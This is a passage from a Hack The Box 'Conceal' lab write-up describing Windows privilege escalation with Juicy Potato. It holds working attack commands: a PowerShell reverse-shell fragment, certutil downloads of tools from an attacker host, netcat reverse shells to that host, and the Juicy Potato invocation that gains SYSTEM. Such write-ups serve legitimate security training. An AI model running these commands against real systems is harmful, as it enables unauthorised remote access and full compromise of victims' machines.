class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length);</span><span class="nv">$stream</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()"</span><span class="w">
</span></code></pre></div></div>
<p><br><img src="/images/hackthebox/conceal/20.png" alt="" class="align-center"><br><br>
We got user.<br></p>

<h2 id="seimpersonateprivilege-juicy-potato-privilege-escalation-and-root-flag">SeImpersonatePrivilege, Juicy Potato, Privilege Escalation and Root Flag</h2>
<p>After getting user the privilege escalation is easy and straightforward. Before doing any enumeration I checked my privileges as <code class="language-plaintext highlighter-rouge">Destitute</code> and I found that I had the <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code>.<br>
<br><img src="/images/hackthebox/conceal/21.png" alt="" class="align-center"><br><br>
This means that we can apply the famous attack <code class="language-plaintext highlighter-rouge">Juicy Potato</code>. You can read about it on the <a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noopener noreferrer">official github repository</a>. We need to know the version of this windows to pick the right <code class="language-plaintext highlighter-rouge">clsid</code>.<br>
<code class="language-plaintext highlighter-rouge">systeminfo</code>
<br><img src="/images/hackthebox/conceal/22.png" alt="" class="align-center"><br><br>
It’s <code class="language-plaintext highlighter-rouge">Microsoft Windows 10 Enterprise</code>. I got the <code class="language-plaintext highlighter-rouge">clsid</code> of  <code class="language-plaintext highlighter-rouge">wuauserv</code> from <a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise" target="_blank" rel="noopener noreferrer">here</a> which is :
<code class="language-plaintext highlighter-rouge">{e60687f7-01a1-40aa-86ac-db1cbf673334}</code>
I got a compiled binary of <code class="language-plaintext highlighter-rouge">Juicy Potato</code> from the github repository. I hosted it on a python simple http server then I downloaded it on the machine with <code class="language-plaintext highlighter-rouge">certutil</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil -urlcache -split -f http://10.10.xx.xx/juicypotato.exe juicypotato.exe
</code></pre></div></div>
<p><br><img src="/images/hackthebox/conceal/23.png" alt="" class="align-center"><br><br>
However I had some problems with my powershell reverse shell and it couldn’t run <code class="language-plaintext highlighter-rouge">juicypotato.exe</code> properly so I got another <code class="language-plaintext highlighter-rouge">cmd</code> shell with <code class="language-plaintext highlighter-rouge">nc</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">nc.exe -e cmd.exe 10.10.xx.xx 1339</code>
<br><img src="/images/hackthebox/conceal/24.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/conceal/25.png" alt="" class="align-center"><br><br>
I created a <code class="language-plaintext highlighter-rouge">bat</code> file that executes : <code class="language-plaintext highlighter-rouge">nc.exe -e cmd.exe 10.10.xx.xx 1340</code> to get me a reverse shell :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo C:\users\Destitute\appdata\local\temp\nc.exe -e cmd.exe 10.10.xx.xx 1340 &gt; rev.bat
</code></pre></div></div>
<p>Then I ran <code class="language-plaintext highlighter-rouge">juicypotato.exe</code> and made it execute that <code class="language-plaintext highlighter-rouge">bat</code> file :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>juicypotato.exe -p C:\users\Destitute\appdata\local\temp\rev.bat -l 1340 -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
</code></pre></div></div>
<p><br><img src="/images/hackthebox/conceal/26.png" alt="" class="align-center"><br><br>
It worked fine and we got a reverse shell as <code class="language-plaintext highlighter-rouge">nt authority\system</code>
<br><img src="/images/hackthebox/conceal/27.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/conceal/28.png" alt="" class="align-center"><br><br>
And we owned root !</p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/lightweight/">Hack The Box - Lightweight</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/chaos/">Hack The Box - Chaos</a></p>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-05-18T07:00:00+02:00">May 18, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/lightweight/" class="pagination--pager" title="Hack The Box - Lightweight
">Previous</a>
    
    
      <a href="/hack-the-box/chaos/" class="pagination--pager" title="Hack The Box - Chaos
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
